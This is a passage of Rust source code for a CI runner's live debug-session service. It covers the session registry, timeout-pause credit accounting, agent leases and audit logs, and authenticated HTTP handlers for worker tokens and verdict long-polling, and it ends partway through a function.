//! Live debug sessions: registry, HTTP surface, and timeout suspension.
//!
//! When a worker fails a step under debugging it does not exit. It opens a
//! session here and long-polls for a verdict. The job stays alive because the
//! worker process stays alive — the VM's lifetime follows the worker, so no
//! orchestrator involvement is needed to hold the machine.
//!
//! What *does* need involvement is timeout accounting. Two clocks would
//! otherwise kill a paused job: the server reaper in [`crate::bootstrap`] and
//! the runner-side timer. Both measure wall time from job start. A session
//! accumulates paused duration, which the reaper subtracts, so `timeout-minutes`
//! measures execution rather than debugging.
//!
//! This is aksh's own surface. Nothing here touches `/_apis/...`.

use std::collections::BTreeMap;
use std::sync::Arc;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use axum::extract::{Path, Query, State};
use axum::{Extension, Json};
use serde::Deserialize;
use serde_json::json;
use tracing::{info, warn};

use aksh_gha_protocol::debug_session::{
    AgentAuditEntry, AgentEvent, AgentEventsResponse, AgentLeaseRequest, AgentLeaseResponse,
    AgentOperation, AgentOperationRequest, AgentOperationResponse, DebugSession,
    OpenSessionRequest, OpenSessionResponse, SessionState, Verdict, VerdictRequest,
    VerdictResponse, WorkerTokenRequest, WorkerTokenResponse,
};

use crate::auth::{JobRuntimeIdentity, WorkerJob};
use crate::errors::ApiError;
use crate::state::SharedState;

/// Longest a worker's verdict long-poll is held before returning empty.
///
/// Bounded so a dropped connection surfaces as a retry rather than a hang. The
/// worker re-polls immediately, so this is not a latency floor on verdicts —
/// those are delivered by notification.
const VERDICT_POLL_MAX: Duration = Duration::from_secs(25);

/// Grace period after a worker stops polling before its session is considered
/// abandoned. Must comfortably exceed [`VERDICT_POLL_MAX`] plus reconnect time.
const WORKER_LIVENESS_WINDOW: Duration = Duration::from_secs(90);

/// Ceiling on the pause credit one job request may subtract from its timeout.
///
/// Without a ceiling `timeout-minutes` stops bounding anything: a worker that
/// keeps polling holds its job — and its microVM — forever, and a debug
/// session becomes a way for a job to opt out of every deadline the control
/// plane has. It also caps the damage from a non-monotonic `SystemTime`: a
/// forward clock jump can inflate one interval, never past this.
///
/// Past the ceiling the job's normal timeout resumes ticking and the reaper
/// cancels it through the ordinary path, so exhaustion needs no separate
/// enforcement.
pub(crate) const MAX_PAUSE_CREDIT: Duration = Duration::from_secs(4 * 60 * 60);

/// Sessions whose history is retained after close. Archives are read by
/// reconnecting agents; without a bound they are a per-run memory leak for the
/// lifetime of the process.
const MAX_ARCHIVED_SESSIONS: usize = 64;

/// Retained structured events per session. A retry loop appends without limit
/// otherwise, and every event is cloned into each poll response.
const MAX_SESSION_EVENTS: usize = 512;

/// Retained audit entries per session.
const MAX_SESSION_AUDIT: usize = 512;

/// Retained idempotency records per session.
const MAX_COMPLETED_OPS: usize = 256;

const AGENT_CONTROL_CAPABILITIES: &[&str] = &["step.retry", "job.retry_from", "job.abort"];

#[derive(Debug, Clone)]
pub(crate) struct AgentLease {
    lease_id: String,
    controller: String,
    capabilities: Vec<String>,
}

/// Server-side session record. The wire projection is
/// [`aksh_gha_protocol::debug_session::DebugSession`].
#[derive(Debug, Clone)]
pub(crate) struct SessionRecord {
    pub(crate) session: DebugSession,
    /// Job request this session pauses, so the reaper can find it.
    pub(crate) request_id: i64,
    /// Agent job the session belongs to. Worker requests are authorized
    /// against this, so one job's runtime token cannot read, resolve, or
    /// close another job's session.
    pub(crate) agent_job_id: uuid::Uuid,
    /// Verdict awaiting pickup by the worker. Cleared once delivered.
    pub(crate) pending_verdict: Option<Verdict>,
    /// Revert policy the controller chose alongside the verdict.
    pub(crate) pending_revert: aksh_gha_protocol::debug_session::RevertPolicy,
    /// Source revision the controller supplied with the verdict.
    pub(crate) pending_revision: Option<String>,
    /// Step index to restart from, when the controller asked for retry-from.
    pub(crate) pending_retry_from_step: Option<usize>,
    /// When the pause began; drives `paused_seconds`.
    pub(crate) paused_since: Option<SystemTime>,
    /// Last time the worker polled. Detects an abandoned session.
    pub(crate) worker_seen_at: SystemTime,
    /// Single mutating agent controller, if one has leased the session.
    pub(crate) agent_lease: Option<AgentLease>,
    /// Structured events retained for reconnecting agents.
    pub(crate) agent_events: Vec<AgentEvent>,
    /// Mutating agent operations, retained as an audit trail.
    pub(crate) agent_audit: Vec<AgentAuditEntry>,
    /// Completed requests, so a retry of the same request ID is harmless.
    pub(crate) completed_agent_ops: BTreeMap<String, AgentOperationResponse>,
}

impl SessionRecord {
    /// Paused duration accumulated so far, including the open interval.
    ///
    /// Capped at [`MAX_PAUSE_CREDIT`]; see that constant for why an uncapped
    /// total is a way to escape `timeout-minutes` entirely.
    fn paused_total(&self, now: SystemTime) -> Duration {
        let banked = Duration::from_secs(self.session.paused_seconds);
        let total = match self.paused_since {
            Some(since) => banked + now.duration_since(since).unwrap_or_default(),
            None => banked,
        };
        total.min(MAX_PAUSE_CREDIT)
    }

    /// Fold the open interval into the banked total and close it.
    fn bank_paused(&mut self, now: SystemTime) {
        if let Some(since) = self.paused_since.take() {
            let delta = now.duration_since(since).unwrap_or_default();
            self.session.paused_seconds =
                self.session.paused_seconds.saturating_add(delta.as_secs());
        }
    }

    fn push_event(
        &mut self,
        event: &str,
        step: Option<aksh_gha_protocol::debug_session::FailedStep>,
        message: Option<String>,
    ) {
        let event_id = self
            .agent_events
            .last()
            .map(|entry| entry.event_id + 1)
            .unwrap_or(1);
        let log_reference = step.as_ref().map(|failed| {
            format!(
                "preloop://runs/{}/jobs/{}/steps/{}/attempts/{}",
                self.session.run_id,
                self.session.job_id,
                failed.index,
                self.session.attempts.len().max(1)
            )
        });
        let capabilities = self
            .agent_lease
            .as_ref()
            .map(|lease| lease.capabilities.clone())
            .unwrap_or_else(|| {
                AGENT_CONTROL_CAPABILITIES
                    .iter()
                    .map(|capability| (*capability).to_owned())
                    .collect()
            });
        self.agent_events.push(AgentEvent {
            event_id,
            event: event.to_owned(),
            session_id: self.session.session_id.clone(),
            session_version: self.session.version,
            run_id: self.session.run_id,
            job_id: self.session.job_id.clone(),
            job_name: self.session.job_name.clone(),
            step,
            log_reference,
            message,
            capabilities,
        });
        // Oldest first: a reconnecting agent cares about recent history, and
        // `event_id` stays monotonic because it is derived from the last entry
        // rather than from the vector length.
        if self.agent_events.len() > MAX_SESSION_EVENTS {
            let excess = self.agent_events.len() - MAX_SESSION_EVENTS;
            self.agent_events.drain(..excess);
        }
    }
}

/// Registry of live debug sessions, keyed by session id.
#[derive(Debug, Default)]
pub(crate) struct DebugSessionRegistry {
    sessions: BTreeMap<String, SessionRecord>,
    /// Retained structured history after a worker closes a session.
    agent_event_archive: BTreeMap<String, Vec<AgentEvent>>,
    agent_audit_archive: BTreeMap<String, Vec<AgentAuditEntry>>,
    /// Archive insertion order, so the oldest history is the first evicted.
    archive_order: std::collections::VecDeque<String>,
    /// Pause credit banked by sessions that have already left the registry,
    /// keyed by the job request that earned it.
    ///
    /// A session's banked total lives in its record, and the record does not
    /// outlive the session: closing it retains the history and drops the rest.
    /// Summed from live records alone, [`Self::paused_for_request`] would snap
    /// back to zero the instant a worker resumed — and the reaper would start
    /// billing the job for the hours it spent paused, cancelling it through a
    /// path no client can see. Credit therefore outlives its session and is
    /// retired only with its request, in [`Self::sweep_abandoned`].
    retired_credit: BTreeMap<i64, Duration>,
    /// Wakes long-pollers when a verdict lands or a session changes.
    ///
    /// Held by the registry rather than by the handlers so the wakeup sits
    /// next to the mutation that justifies it and cannot be forgotten at a new
    /// call site.
    notify: Arc<tokio::sync::Notify>,
}

impl DebugSessionRegistry {
    /// Open a session for a worker that just failed a step.
    ///
    /// Reopening for the same (run, job) replaces the prior record: a retry
    /// that fails again is the same debugging session continuing, and the
    /// attempt journal carries the history.
    pub(crate) fn open(
        &mut self,
        request_id: i64,
        req: OpenSessionRequest,
        now: SystemTime,
    ) -> DebugSession {
        let agent_job_id = req.agent_job_id;
        let existing = self
            .sessions
            .iter()
            .find(|(_, r)| r.session.run_id == req.run_id && r.session.job_id == req.job_id)
            .map(|(id, r)| (id.clone(), r.clone()));

        let (
            session_id,
            version,
            banked,
            agent_lease,
            agent_events,
            agent_audit,
            completed_agent_ops,
        ) = match existing {
            Some((id, old)) => {
                self.sessions.remove(&id);
                (
                    id,
                    old.session.version + 1,
                    old.session.paused_seconds,
                    old.agent_lease,
                    old.agent_events,
                    old.agent_audit,
                    old.completed_agent_ops,
                )
            }
            None => (
                format!("dbg_{}", uuid::Uuid::new_v4().simple()),
                1,
                0,
                None,
                Vec::new(),
                Vec::new(),
                BTreeMap::new(),
            ),
        };

        let session = DebugSession {
            session_id: session_id.clone(),
            run_id: req.run_id,
            job_id: req.job_id,
            job_name: req.job_name,
            state: SessionState::Paused,
            version,
            step: req.step,
            attempts: req.attempts,
            attempt_changes: req.attempt_changes,
            job_steps: req.job_steps,
            machine: req.machine,
            // Reaches a controller's shell as a `cd` target. Rejecting a
            // relative or shell-active path here means no consumer has to
            // remember to sanitize it.
            workspace: req.workspace.filter(|path| plausible_workspace(path)),
            snapshot_commit: req.snapshot_commit,
            source_revision: "original".to_owned(),
            controller: None,
            created_at_ms: now
                .duration_since(UNIX_EPOCH)
                .unwrap_or_default()
                .as_millis() as u64,
            paused_seconds: banked,
        };

        let mut record = SessionRecord {
            session: session.clone(),
            request_id,
            agent_job_id,
            pending_verdict: None,
            pending_revert: Default::default(),
            pending_revision: None,
            pending_retry_from_step: None,
            paused_since: Some(now),
            worker_seen_at: now,
            agent_lease,
            agent_events,
            agent_audit,
            completed_agent_ops,
        };
        record.push_event("step_failed", Some(record.session.step.clone()), None);
        self.sessions.insert(session_id, record);
        self.notify.notify_waiters();
        session
    }

    /// Record a controller's decision. Returns the updated session.
    pub(crate) fn set_verdict(
        &mut self,
        session_id: &str,
        req: &VerdictRequest,
    ) -> Option<DebugSession> {
        let record = self.sessions.get_mut(session_id)?;
        record.pending_verdict = Some(req.verdict);
        record.pending_revert = req.revert;
        record.pending_revision = req.source_revision.clone();
        record.pending_retry_from_step = req.retry_from_step;
        if let Some(revision) = &req.source_revision {
            record.session.source_revision = revision.clone();
        }
        record.session.controller = req.controller.clone();
        record.session.version += 1;
        record.session.state = match req.verdict {
            Verdict::Retry => SessionState::Retrying,
            Verdict::Continue => SessionState::Resumed,
            Verdict::Abort => SessionState::Aborted,
        };
        self.notify.notify_waiters();
        Some(record.session.clone())
    }

    pub(crate) fn acquire_agent_lease(
        &mut self,
        session_id: &str,
        req: &AgentLeaseRequest,
    ) -> Result<AgentLeaseResponse, String> {
        if req.controller.trim().is_empty() {
            return Err("controller must not be empty".to_owned());
        }
        // Agents always receive every supported capability.  The field
        // exists so a future sandboxed-agent mode can restrict it; for now
        // the full set is unconditional.
        let requested: Vec<String> = AGENT_CONTROL_CAPABILITIES
            .iter()
            .map(|capability| (*capability).to_owned())
            .collect();
        let record = self
            .sessions
            .get_mut(session_id)
            .ok_or_else(|| format!("no such session: {session_id}"))?;
        if let Some(existing) = &record.agent_lease {
            if existing.controller == req.controller {
                return Ok(AgentLeaseResponse {
                    lease_id: existing.lease_id.clone(),
                    controller: existing.controller.clone(),
                    capabilities: existing.capabilities.clone(),
                    session_version: record.session.version,
                });
            }
            return Err(format!(
                "session is already leased by `{}`",
                existing.controller
            ));
        }
        let lease = AgentLease {
            lease_id: format!("lease_{}", uuid::Uuid::new_v4().simple()),
            controller: req.controller.clone(),
            capabilities: requested,
        };
        let response = AgentLeaseResponse {
            lease_id: lease.lease_id.clone(),
            controller: lease.controller.clone(),
            capabilities: lease.capabilities.clone(),
            session_version: record.session.version,
        };
        record.agent_lease = Some(lease);
        record.push_event("agent_attached", None, Some(req.controller.clone()));
        self.notify.notify_waiters();
        Ok(response)
    }

    pub(crate) fn release_agent_lease(
        &mut self,
        session_id: &str,
        lease_id: &str,
    ) -> Result<(), String> {
        let record = self
            .sessions
            .get_mut(session_id)
            .ok_or_else(|| format!("no such session: {session_id}"))?;
        if record
            .agent_lease
            .as_ref()
            .is_none_or(|lease| lease.lease_id != lease_id)
        {
            return Err("invalid agent lease".to_owned());
        }
        let controller = record.agent_lease.take().map(|lease| lease.controller);
        record.push_event("agent_detached", None, controller);
        self.notify.notify_waiters();
        Ok(())
    }

    pub(crate) fn agent_events(
        &self,
        session_id: &str,
        after: u64,
    ) -> Result<AgentEventsResponse, String> {
        let all_events = self
            .sessions
            .get(session_id)
            .map(|record| record.agent_events.clone())
            .or_else(|| self.agent_event_archive.get(session_id).cloned())
            .ok_or_else(|| format!("no such session: {session_id}"))?;
        let next_event_id = all_events.last().map_or(after, |event| event.event_id);
        let events = all_events
            .iter()
            .filter(|event| event.event_id > after)
            .cloned()
            .collect::<Vec<_>>();
        Ok(AgentEventsResponse {
            events,
            next_event_id,
        })
    }

    pub(crate) fn agent_audit(&self, session_id: &str) -> Result<Vec<AgentAuditEntry>, String> {
        self.sessions
            .get(session_id)
            .map(|record| record.agent_audit.clone())
            .or_else(|| self.agent_audit_archive.get(session_id).cloned())
            .ok_or_else(|| format!("no such session: {session_id}"))
    }

    pub(crate) fn agent_operation(
        &mut self,
        session_id: &str,
        req: AgentOperationRequest,
    ) -> Result<AgentOperationResponse, String> {
        if req.request_id.trim().is_empty() {
            return Err("request_id must not be empty".to_owned());
        }
        let record = self
            .sessions
            .get_mut(session_id)
            .ok_or_else(|| format!("no such session: {session_id}"))?;
        if let Some(previous) = record.completed_agent_ops.get(&req.request_id) {
            return Ok(previous.clone());
        }
        let (lease_id, controller, capabilities) = record
            .agent_lease
            .as_ref()
            .map(|lease| {
                (
                    lease.lease_id.clone(),
                    lease.controller.clone(),
                    lease.capabilities.clone(),
                )
            })
            .ok_or_else(|| "session has no active agent lease".to_owned())?;
        if lease_id != req.lease_id {
            return Err("invalid agent lease".to_owned());
        }
        let required_capability = match &req.operation {
            AgentOperation::Retry { .. } => "step.retry",
            AgentOperation::RetryFrom { .. } => "job.retry_from",
            AgentOperation::Abort => "job.abort",
        };
        if !capabilities
            .iter()
            .any(|capability| capability == required_capability)
        {
            return Err(format!(
                "agent lease lacks capability `{required_capability}`"
            ));
        }
        if req.expected_version != record.session.version {
            return Err(format!(
                "stale session version: expected {}, current {}",
                req.expected_version, record.session.version
            ));
        }

        let (verdict, retry_from_step, revert, event, status) = match req.operation {
            AgentOperation::Retry { revert } => {
                (Verdict::Retry, None, revert, "retry_requested", "retrying")
            }
            AgentOperation::RetryFrom { step_index, revert } => {
                if step_index > record.session.step.index {
                    return Err(format!(
                        "step {step_index} is after failed step {}",
                        record.session.step.index
                    ));
                }
                if step_index >= record.session.step.total {
                    return Err(format!(
                        "step {step_index} is outside the job's {} steps",
                        record.session.step.total
                    ));
                }
                (
                    Verdict::Retry,
                    Some(step_index),
                    revert,
                    "retry_from_requested",
                    "retrying",
                )
            }
            AgentOperation::Abort => (
                Verdict::Abort,
                None,
                Default::default(),
                "abort_requested",
                "aborting",
            ),
        };

        let prev_version = record.session.version;
        record.pending_verdict = Some(verdict);
        record.pending_revert = revert;
        record.pending_revision = None;
        record.pending_retry_from_step = retry_from_step;
        record.session.controller = Some(controller.clone());
        record.session.version += 1;
        record.session.state = match verdict {
            Verdict::Retry => SessionState::Retrying,
            Verdict::Abort => SessionState::Aborted,
            Verdict::Continue => SessionState::Resumed,
        };
        record.push_event(event, None, Some(format!("request_id={}", req.request_id)));
        let response = AgentOperationResponse {
            request_id: req.request_id.clone(),
            prev_version,
            new_version: record.session.version,
            status: status.to_owned(),
            session: record.session.clone(),
        };
        record.agent_audit.push(AgentAuditEntry {
            request_id: req.request_id.clone(),
            controller,
            operation: event.to_owned(),
            status: status.to_owned(),
            prev_version,
            new_version: record.session.version,
            timestamp_ms: SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap_or_default()
                .as_millis() as u64,
        });
        if record.agent_audit.len() > MAX_SESSION_AUDIT {
            let excess = record.agent_audit.len() - MAX_SESSION_AUDIT;
            record.agent_audit.drain(..excess);
        }
        record
            .completed_agent_ops
            .insert(req.request_id, response.clone());
        // Idempotency only has to survive a client retry, not the whole
        // session. Evicting in key order is arbitrary but bounded, and a
        // replay past the bound re-executes rather than corrupting anything —
        // the `expected_version` check rejects it.
        while record.completed_agent_ops.len() > MAX_COMPLETED_OPS {
            let Some(oldest) = record.completed_agent_ops.keys().next().cloned() else {
                break;
            };
            record.completed_agent_ops.remove(&oldest);
        }
        self.notify.notify_waiters();
        Ok(response)
    }

    /// Deliver a pending verdict to the worker, closing the paused interval.
    ///
    /// Consuming the verdict is what banks the paused duration — the job
    /// resumes executing at this instant, so timeout accounting resumes too.
    pub(crate) fn take_verdict(
        &mut self,
        session_id: &str,
        now: SystemTime,
    ) -> Option<VerdictResponse> {
        let record = self.sessions.get_mut(session_id)?;
        record.worker_seen_at = now;
        let verdict = record.pending_verdict.take();
        if verdict.is_some() {
            record.bank_paused(now);
        }
        Some(VerdictResponse {
            verdict,
            version: record.session.version,
            revert: record.pending_revert,
            source_revision: record.pending_revision.clone(),
            retry_from_step: record.pending_retry_from_step.take(),
        })
    }

    /// Close a session once the worker has acted on its verdict.
    pub(crate) fn close(&mut self, session_id: &str, state: SessionState, now: SystemTime) {
        let retain_for_agent_reconnect = state == SessionState::Resumed
            && self
                .sessions
                .get(session_id)
                .and_then(|record| record.agent_lease.as_ref())
                .is_some();
        if let Some(record) = self.sessions.get_mut(session_id) {
            record.bank_paused(now);
            record.session.state = state;
            record.session.version += 1;
            record.push_event("session_closed", None, Some(state.as_str().to_owned()));
        }
        if !state.is_open() && !retain_for_agent_reconnect {
            if let Some(record) = self.sessions.remove(session_id) {
                self.retire(session_id.to_owned(), record);
            }
        }
        self.notify.notify_waiters();
    }

    /// Drop a record for good, keeping what has to outlive it.
    ///
    /// Two things do: the agent-visible history, so a reconnecting controller
    /// can still read what happened, and the pause credit, so the reaper does
    /// not re-bill the job for time it already spent paused. Both are bounded —
    /// history by [`MAX_ARCHIVED_SESSIONS`], credit by the request's lifetime.
    fn retire(&mut self, session_id: String, record: SessionRecord) {
        // `paused_seconds` is complete only if the open interval was banked
        // first; both callers do that before handing the record over.
        self.bank_credit(
            record.request_id,
            Duration::from_secs(record.session.paused_seconds),
        );
        if self
            .agent_event_archive
            .insert(session_id.clone(), record.agent_events)
            .is_none()
        {
            self.archive_order.push_back(session_id.clone());
        }
        self.agent_audit_archive
            .insert(session_id, record.agent_audit);
        while self.archive_order.len() > MAX_ARCHIVED_SESSIONS {
            if let Some(evicted) = self.archive_order.pop_front() {
                self.agent_event_archive.remove(&evicted);
                self.agent_audit_archive.remove(&evicted);
            }
        }
    }

    /// Add a closed session's banked pause to its request's standing credit.
    ///
    /// Saturating and capped at [`MAX_PAUSE_CREDIT`]: a retry loop banks a
    /// fresh interval on every failure, and the ceiling is per request
    /// precisely so failing repeatedly cannot buy unbounded credit.
    fn bank_credit(&mut self, request_id: i64, banked: Duration) {
        if banked.is_zero() {
            return;
        }
        let credit = self.retired_credit.entry(request_id).or_default();
        *credit = credit.saturating_add(banked).min(MAX_PAUSE_CREDIT);
    }

    /// Paused duration to exclude from timeout accounting for a job request.
    ///
    /// Summed across every session the request has had — live and retired —
    /// because a job that failed, retried, and failed again banked time in each
    /// pause, then capped: a per-session ceiling would be trivially bypassed by
    /// failing repeatedly.
    pub(crate) fn paused_for_request(&self, request_id: i64, now: SystemTime) -> Duration {
        self.sessions
            .values()
            .filter(|r| r.request_id == request_id)
            .map(|r| r.paused_total(now))
            .sum::<Duration>()
            .saturating_add(
                self.retired_credit
                    .get(&request_id)
                    .copied()
                    .unwrap_or_default(),
            )
            .min(MAX_PAUSE_CREDIT)
    }

    /// Whether a job request has an open session that still holds it.
    ///
    /// A request out of pause credit stops protecting the job from the
    /// disconnect reaper: at that point the pause is no longer something the
    /// control plane is willing to wait for. The ceiling applies to the
    /// request's whole history, so reopening a session does not renew it.
    pub(crate) fn is_paused(&self, request_id: i64, now: SystemTime) -> bool {
        let held = self
            .sessions
            .values()
            .any(|r| r.request_id == request_id && r.session.state.is_open());
        held && self.paused_for_request(request_id, now) < MAX_PAUSE_CREDIT
    }

    /// Handle a long-poller registers on before checking session state.
    ///
    /// Cloned out under the state lock once per poll, so waiting itself never
    /// touches the lock the whole control plane shares.
    pub(crate) fn notify(&self) -> Arc<tokio::sync::Notify> {
        Arc::clone(&self.notify)
    }

    /// The agent job a session belongs to, for authorizing worker requests.
    pub(crate) fn owner(&self, session_id: &str) -> Option<uuid::Uuid> {
        self.sessions.get(session_id).map(|r| r.agent_job_id)
    }

    /// Session by id.
    pub(crate) fn get(&self, session_id: &str) -> Option<&SessionRecord> {
        self.sessions.get(session_id)
    }

    /// All open sessions, newest first.
    pub(crate) fn list(&self) -> Vec<DebugSession> {
        let mut out: Vec<_> = self
            .sessions
            .values()
            .filter(|r| r.session.state.is_open())
            .map(|r| r.session.clone())
            .collect();
        out.sort_by_key(|session| std::cmp::Reverse(session.created_at_ms));
        out
    }

    /// Drop sessions whose worker stopped polling, or whose job is over.
    ///
    /// A worker that dies mid-pause must not pin timeout suspension forever;
    /// otherwise a crashed job would never be reaped. A job that has since
    /// been cancelled or completed is the same situation arrived at from the
    /// other direction: its session can no longer be acted on, so retaining it
    /// only leaks memory and confuses `preloop debug`.
    pub(crate) fn sweep_abandoned(
        &mut self,
        now: SystemTime,
        active_requests: &std::collections::BTreeSet<i64>,
    ) -> Vec<String> {
        let stale: Vec<String> = self
            .sessions
            .iter()
            .filter(|(_, r)| {
                now.duration_since(r.worker_seen_at).unwrap_or_default() > WORKER_LIVENESS_WINDOW
                    || !active_requests.contains(&r.request_id)
            })
            .map(|(id, _)| id.clone())
            .collect();
        for id in &stale {
            if let Some(mut record) = self.sessions.remove(id) {
                // The interval is still open — the worker stopped polling
                // mid-pause. Close it here or the credit earned up to the
                // sweep is lost and the reaper re-bills the job for it.
                record.bank_paused(now);
                self.retire(id.clone(), record);
            }
        }
        // A request that is no longer active has nobody left to ask about its
        // credit: it can neither time out nor be reaped again. This is the only
        // thing that bounds the credit map over a long-lived server.
        self.retired_credit
            .retain(|request_id, _| active_requests.contains(request_id));
        if !stale.is_empty() {
            self.notify.notify_waiters();
        }
        stale
    }

    /// Resolve a user-supplied reference: full session id, or a unique prefix
    /// of a session id or run id.
    pub(crate) fn resolve(&self, reference: &str) -> Option<String> {
        if self.sessions.contains_key(reference) || self.agent_event_archive.contains_key(reference)
        {
            return Some(reference.to_owned());
        }
        let matches: Vec<&String> = self
            .sessions
            .iter()
            .filter(|(id, r)| {
                id.starts_with(reference)
                    || r.session.run_id.to_string().starts_with(reference)
                    || r.session.job_name == reference
            })
            .map(|(id, _)| id)
            .collect();
        match matches.as_slice() {
            [single] => Some((*single).clone()),
            _ => None,
        }
    }

    /// Move a session's pause start into the past so timeout suspension can be
    /// exercised without sleeping.
    #[cfg(test)]
    pub(crate) fn backdate_pause_for_test(&mut self, session_id: &str, since: SystemTime) {
        if let Some(record) = self.sessions.get_mut(session_id) {
            record.paused_since = Some(since);
        }
    }
}

// ---------------------------------------------------------------------------
// HTTP handlers
// ---------------------------------------------------------------------------

/// Reject a workspace path that is not usable as one.
///
/// The value is worker-supplied and ends up in a controller's `cd`, so it must
/// be an absolute path with no shell-active characters. Enforced at the door
/// rather than at each consumer: there is more than one consumer.
fn plausible_workspace(path: &str) -> bool {
    path.starts_with('/')
        && !path.is_empty()
        && !path.contains([
            '\0', '\n', '\r', '\'', '"', '`', '$', ';', '&', '|', '<', '>', '(', ')',
        ])
}

/// Worker: exchange the job runtime token for this job's debug-worker token.
///
/// This exchange exists because the credential cannot ride along in the job
/// message. The official runner projects every `isSecret` variable into the
/// `secrets` context, so a `system.preloop.debug_worker_token` variable would
/// be readable from workflow YAML — the exact privilege the debug split
/// withholds. The Rust runner's own `system.*` filter protected only the Rust
/// runner; the server does not choose which runner claims a job.
///
/// Every condition below is load-bearing, and none of them is a fallback:
///
/// 1. The presented token must be a job runtime token naming a single job
///    (enforced by [`crate::auth::require_job_runtime_bearer`]).
/// 2. The named job must be the one being asked for — a job cannot acquire a
///    credential for its neighbour.
/// 3. That job must have a live, uncompleted request.
/// 4. Its run must have opted into pause-on-failure. Without the opt-in no
///    debug credential exists for the job at all.
/// 5. The exchange is one-shot. The worker spends it during job setup, before
///    the first step runs, so a step that later replays the runtime token it
///    sees as `ACTIONS_RUNTIME_TOKEN` finds nothing left to spend.
pub(crate) async fn issue_worker_token(
    State(shared): State<Arc<SharedState>>,
    Extension(caller): Extension<JobRuntimeIdentity>,
    Json(req): Json<WorkerTokenRequest>,
) -> Result<Json<WorkerTokenResponse>, ApiError> {
    if caller.0 != req.agent_job_id {
        return Err(ApiError::forbidden(
            "a job may only acquire its own debug-worker token",
        ));
    }
    let mut inner = shared.state.inner.lock().await;

    // Keyed on the agent job GUID for the same reason `open_session` is: it is
    // what the worker knows itself as, and it separates matrix legs sharing a
    // workflow-level job id.
    let request_id = inner
        .agent_job_requests
        .get(&req.agent_job_id)
        .copied()
        .filter(|id| {
            inner
                .job_requests
                .get(id)
                .is_some_and(|record| record.result.is_none())
        })
        .ok_or_else(|| {
            ApiError::not_found(format!(
                "no active job request for agent job {}",
                req.agent_job_id
            ))
        })?;

    let record = inner
        .job_requests
        .get(&request_id)
        .expect("request id came from a liveness-filtered lookup");
    let (run_id, plan_id, already_issued) = (
        record.run_id,
        record.plan_id.clone(),
        record.debug_token_issued,
    );

    // The runner only builds a pause client under `preloopPreserveOnFailure`,
    // so gating on the same flag issues the credential exactly when it is
    // used, and never otherwise.
    let preserve = inner
        .runs
        .get(&run_id)
        .is_some_and(|run| run.submission.preserve_on_failure);
    if !preserve {
        return Err(ApiError::forbidden(
            "this run did not enable pause-on-failure",
        ));
    }
    if already_issued {
        // Distinct from a 403 so a worker can tell "someone beat me to it"
        // from "not allowed at all" in its log.
        return Err(ApiError::conflict(format!(
            "debug-worker token already issued for agent job {}",
            req.agent_job_id
        )));
    }

    inner
        .job_requests
        .get_mut(&request_id)
        .expect("request id came from a liveness-filtered lookup")
        .debug_token_issued = true;
    drop(inner);

    info!(
        %run_id,
        agent_job = %req.agent_job_id,
        "issued debug-worker token to the job's worker"
    );
    Ok(Json(WorkerTokenResponse {
        token: shared
            .state
            .mint_debug_worker_token(&plan_id, &req.agent_job_id),
    }))
}

/// Worker: open a session after a step failed.
///
/// Authorized against the runtime token's own job: a worker may only pause
/// itself. Without this a live job's token opens sessions for any other live
/// job, suspending its timeout and publishing an invented failure.
pub(crate) async fn open_session(
    State(shared): State<Arc<SharedState>>,
    Extension(caller): Extension<WorkerJob>,
    Json(req): Json<OpenSessionRequest>,
) -> Result<Json<OpenSessionResponse>, ApiError> {
    if caller.0 != req.agent_job_id {
        return Err(ApiError::forbidden(
            "a job may only open a debug session for itself",
        ));
    }
    let now = SystemTime::now();
    let mut inner = shared.state.inner.lock().await;

    // Keyed on the agent job GUID: it is what the worker knows itself as, and
    // it disambiguates matrix legs that share a workflow-level job id.
    let request_id = inner
        .agent_job_requests
        .get(&req.agent_job_id)
        .copied()
        .filter(|id| {
            inner
                .job_requests
                .get(id)
                .is_some_and(|record| record.result.is_none())
        })
        .ok_or_else(|| {
            ApiError::not_found(format!(
                "no active job request for agent job {}",
                req.agent_job_id
            ))
        })?;

    let run_id = req.run_id;
    let job_name = req.job_name.clone();
    let step_name = req.step.display_name.clone();
    let session = inner.debug_sessions.open(request_id, req, now);

    info!(
        %run_id,
        job = %job_name,
        step = %step_name,
        session = %session.session_id,
        "step failed — debug session opened; job timeout suspended"
    );

    Ok(Json(OpenSessionResponse {
        session_id: session.session_id,
    }))
}

/// Query parameters for the worker's verdict long poll.
#[derive(Debug, Deserialize)]
pub(crate) struct VerdictPollQuery {
    /// Seconds to hold the request open. Clamped to [`VERDICT_POLL_MAX`].
    #[serde(default)]
    wait: Option<u64>,
}

/// Confirm the caller owns the session it named, and return its canonical id.
///
/// Worker routes address sessions by id, and taking a verdict *consumes* it.
/// Without an ownership check any live job's token could drain another job's
/// verdict — the real worker would then wait out the liveness window and be
/// swept, which reads as a hang with no attributable cause.
fn owned_session(
    inner: &crate::state::InnerState,
    session_id: &str,
    caller: WorkerJob,
) -> Result<(), ApiError> {
    match inner.debug_sessions.owner(session_id) {
        Some(owner) if owner == caller.0 => Ok(()),
        // Deliberately indistinguishable from a missing session: a worker must
        // not be able to probe for other jobs' session ids.
        _ => Err(ApiError::not_found(format!(
            "no such session: {session_id}"
        ))),
    }
}

/// Worker: long-poll for a verdict.
///
/// Returns `verdict: null` on timeout. A null is emphatically not an abort —
/// conflating them would turn a flaky connection into a cancelled job.
pub(crate) async fn poll_verdict(
    State(shared): State<Arc<SharedState>>,
    Extension(caller): Extension<WorkerJob>,
    Path(session_id): Path<String>,
    Query(query): Query<VerdictPollQuery>,
) -> Result<Json<VerdictResponse>, ApiError> {
    let wait = query
        .wait
        .map(Duration::from_secs)
        .unwrap_or(VERDICT_POLL_MAX)
        .min(VERDICT_POLL_MAX);
    let deadline = tokio::time::Instant::now() + wait;
    let notify = shared.state.inner.lock().await.debug_sessions.notify();

    loop {
        // Registered before the state check, so a verdict landing in the gap
        // between the two wakes this waiter instead of being missed until the
        // deadline.
        let notified = notify.notified();
        {
            let mut inner = shared.state.inner.lock().await;
            owned_session(&inner, &session_id, caller)?;
            let response = inner
                .debug_sessions
                .take_verdict(&session_id, SystemTime::now())
                .ok_or_else(|| ApiError::not_found(format!("no such session: {session_id}")))?;
            if response.verdict.is_some() || tokio::time::Instant::now() >= deadline {
                return Ok(Json(response));
            }
        }
        tokio::select! {
            () = notified => {}
            () = tokio::time::sleep_until(deadline) => {}
        }
    }
}

/// Body of a worker's session close.
#[derive(Debug, Deserialize)]
pub(crate) struct CloseSessionRequest {
    /// Terminal state the worker reached. Absent means it resumed.
    #[serde(default = "resumed")]
    state: SessionState,
}

fn resumed() -> SessionState {
